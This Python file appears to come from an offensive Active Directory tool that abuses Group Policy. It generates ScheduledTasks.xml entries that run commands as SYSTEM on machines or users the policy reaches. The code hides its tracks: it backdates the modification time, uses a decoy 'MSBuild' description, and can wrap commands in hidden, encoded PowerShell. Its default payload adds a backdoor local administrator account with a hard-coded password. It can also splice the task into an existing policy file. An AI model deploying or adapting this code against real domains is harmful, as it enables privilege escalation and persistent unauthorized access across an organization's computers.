import binascii
import logging
import os
import re
import uuid
from base64 import b64encode
from datetime import datetime, timedelta
from xml.sax.saxutils import escape, quoteattr
import xml.etree.ElementTree as ET



class ScheduledTask:
    def __init__(self, gpo_type="computer", name="", mod_date="", description="", powershell=False, command="", old_value="", filter_enabled=False, target_dns_name="", target_username="", target_user_sid="", run_once=True):
        self._type = gpo_type

        if name:
            self._name = escape(name, {'"': '&quot;'})
        else:
            self._name = "TASK_" + binascii.b2a_hex(os.urandom(4)).decode('ascii')

        if mod_date:
            self._mod_date = mod_date
        else:
            mod_date = datetime.now() - timedelta(days=30)
            self._mod_date = mod_date.strftime("%Y-%m-%d %H:%M:%S")
        self._guid = str(uuid.uuid4()).upper()
        self._author = "NT AUTHORITY\\System"
        if description:
            self._description = escape(description)
        else:
            self._description = "MSBuild build and release task"

        if powershell:
            self._shell = escape("powershell.exe")
            if command:
                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
            else:
                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
        else:
            self._shell = escape('c:\\windows\\system32\\cmd.exe')
            if command:
                self._command = escape('/c "{}"'.format(command))
            else:
                self._command = escape('/c "net user john H4x00r123.. /add && net localgroup administrators john /add"')

        logging.debug(self._shell + " " + self._command)
        self._old_value = old_value

        self._task_str_begin = f"""<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{{CC63F200-7309-4ba0-B154-A71CD118DBCC}}">"""
        if self._type == "computer":
            self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}" userContext="0" removePolicy="0"><Properties action="C" name="{self._name}" runAs="NT AUTHORITY\\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>S4U</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2>"""
        elif self._type == "user-as-admin":
            self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}"><Properties action="C" name="{self._name}" runAs="NT AUTHORITY\\System" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>"""
        else:
            self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}"><Properties action="C" name="{self._name}" runAs="%LogonDomain%\\%LogonUser%" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>%LogonDomain%\\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>"""

        # Build Item-Level Targeting filters
        # FilterRunOnce implements "Apply once and do not reapply"
        # Additional FilterComputer/FilterUser narrows the scope to specific targets
        filter_items = []

        if run_once:
            run_once_guid = str(uuid.uuid4()).upper()
            filter_items.append('<FilterRunOnce hidden="1" not="0" bool="AND" id="{}"/>'.format(run_once_guid))

        if filter_enabled:
            if self._type == "computer":
                if target_dns_name:
                    _dns = escape(target_dns_name, {'"': '&quot;'})
                    filter_items.append('<FilterComputer bool="AND" not="0" type="DNS" name="{}"/>'.format(_dns))
            else:
                if target_username or target_user_sid:
                    _fu = '<FilterUser bool="AND" not="0"'
                    if target_username:
                        _fu += ' name="{}"'.format(escape(target_username, {'"': '&quot;'}))
                    if target_user_sid:
                        _fu += ' sid="{}"'.format(escape(target_user_sid, {'"': '&quot;'}))
                    _fu += '/>'
                    filter_items.append(_fu)

        if filter_items:
            self._filters = '<Filters>' + ''.join(filter_items) + '</Filters>'
        else:
            self._filters = ""

        if self._filters:
            self._task_str = self._task_str.replace(
                "</Properties></ImmediateTaskV2>",
                "</Properties>" + self._filters + "</ImmediateTaskV2>"
            )

        self._task_str_end = f"""</ScheduledTasks>"""

    def generate_scheduled_task_xml(self):
        if self._old_value == "":
            return self._task_str_begin + self._task_str + self._task_str_end

        return re.sub(r"< */ *ScheduledTasks>", self._task_str.replace("\\", "\\\\") + self._task_str_end, self._old_value)

    def get_name(self):
        return self._name

    def parse_tasks(self, xml_tasks):
        elem = ET.fromstring(xml_tasks)
        tasks = []
        for child in elem.findall("*"):
            task_type = child.tag
            task_properties = child.find("Properties")
            if task_properties is None:
                tasks.append(["?", "<unknown>", task_type or "<unknown>"])
                continue
            action = task_properties.get('action')
            name = task_properties.get('name')
            tasks.append([
                action if action is not None else "?",
                name if name is not None else "<unknown>",
                task_type if task_type is not None else "<unknown>"
            ])
        return tasks
